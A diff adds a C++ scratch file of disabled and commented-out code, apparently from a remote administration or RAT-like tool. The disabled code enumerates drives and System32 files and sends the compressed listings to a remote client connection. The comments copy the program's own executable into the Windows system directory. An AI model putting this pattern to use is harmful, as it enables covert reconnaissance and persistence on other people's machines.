@@ -1,0 +1,126 @@
+#if 0
+	if (rms_client->connect(&remote_addr)) {
+		std::vector<std::wstring> drives;
+		if (file_explorer::get_all_drives(drives)) {
+			json j;
+			for (const auto& drive : drives) {
+				if (file_explorer::get_drive_info(j, drive)) {
+					zip::compressd_data_type out;
+					auto s = j.dump();
+					if (zip::compress_zstd(s.data(), s.size(), out)) {
+						rms_msg::rms_msg_item msg;
+						if (rms_msg::make_msg(out.data, msg, true, out.raw_size)) {
+							if (rms_client->send(msg.second, msg.first)) {
+								std::cout << "ok\n";
+							}
+							rms_msg::free_msg(msg);
+						}
+					}
+				}
+			}
+		}
+
+		json j;
+		if (file_explorer::list_files(j, L"C:\\Windows\\System32\\")) {
+			zip::compressd_data_type out;
+			auto s = j.dump();
+			if (zip::compress_zstd(s.data(), s.size(), out)) {
+				rms_msg::rms_msg_item msg;
+				if (rms_msg::make_msg(out.data, msg, true, out.raw_size)) {
+					if (rms_client->send(msg.second, msg.first)) {
+						std::cout << "ok\n";
+					}
+					rms_msg::free_msg(msg);
+				}
+			}
+		}
+
+		while (rms_client->is_connected()) {
+			while (!rms_client->received_size() && rms_client->is_connected()) {
+				std::this_thread::sleep_for(std::chrono::seconds(1));
+			}
+
+			if (rms_client->received_size()) {
+				auto len = rms_client->received_size();
+				std::string s;
+				s.resize(len);
+				len = rms_client->get(const_cast<char*>(s.data()), s.size());
+				if (len) {
+					//s.resize(len);
+					std::cout << s << std::endl;
+				}
+			}
+		}
+
+		rms_client->disconnect();
+	}
+
+	delete rms_client;
+	delete server;
+
+	std::cin.get();
+#endif
+
+
+//DWORD dirLen = 0;
+		//dirLen = GetCurrentDirectoryW(dirLen, nullptr);
+		//GetCommandLineW();
+		//if (dirLen) {
+		//	g_SelfPath.resize(dirLen);
+		//	dirLen = GetCurrentDirectoryW(dirLen, const_cast<wchar_t*>(g_SelfPath.data()));
+		//}
+
+		//if (dirLen) {
+		//	g_SelfPath.resize(dirLen);
+		//	auto fileName = std::wstring(argv[0]);
+		//	auto lastIdx = fileName.find_last_of(L'\\');
+		//	if (lastIdx != std::wstring::npos) {
+		//		fileName.erase(0, lastIdx + 1);
+		//	}
+
+		//	g_SelfPath.append(L"\\").append(fileName);
+		//} else {
+		g_SelfPath = argv[0];
+	//}
+
+
+	
+	//GetSystemDirectoryW();
+	//CopyFileW(g_SelfPath.c_str(), )
+
+		//GetModuleFileNameW(nullptr, )
+		//DWORD imageNameLen = 0;
+		//if (QueryFullProcessImageNameW(GetCurrentProcess(), 0, nullptr, &imageNameLen)) return -1;
+		//g_SelfPath.resize(imageNameLen + 1);
+		//if (!QueryFullProcessImageNameW(GetCurrentProcess(), 0, (LPWSTR)g_SelfPath.data(), &imageNameLen)) return -1;
+
+
+					//std::wstring tempFilePath;
+			//tempFilePath.resize(MAX_PATH);
+			//tempFilePath.resize(GetTempPathW(tempFilePath.size(), const_cast<wchar_t*>(tempFilePath.data())));
+			////GetTempFileNameW()
+
+			//CopyFileW(g_SelfPath.c_str(), tempFilePath.c_str(), FALSE);
+
+			//auto dirLen = GetSystemWindowsDirectoryW(nullptr, 0);
+			//if (dirLen) {
+			//	std::wstring sysPath;
+			//	sysPath.resize(dirLen);
+			//	dirLen = GetSystemWindowsDirectoryW(const_cast<wchar_t*>(sysPath.data()), dirLen);
+			//	if (dirLen) {
+			//		sysPath.resize(dirLen);
+			//		//sysPath.append(L"\\");
+			//		//auto fileName = std::wstring(argv[0]);
+			//		auto lastIdx = g_SelfPath.find_last_of(L'\\');
+			//		if (lastIdx != std::wstring::npos) {
+			//			sysPath.append(g_SelfPath.substr(lastIdx));
+			//			//fileName.erase(0, lastIdx + 1);
+			//			if (CopyFileW(g_SelfPath.c_str(), sysPath.c_str(), FALSE)) {
+			//				g_SelfPath = std::move(sysPath);
+			//			}
+			//		}
+			//	}
+			//}
+
+
+
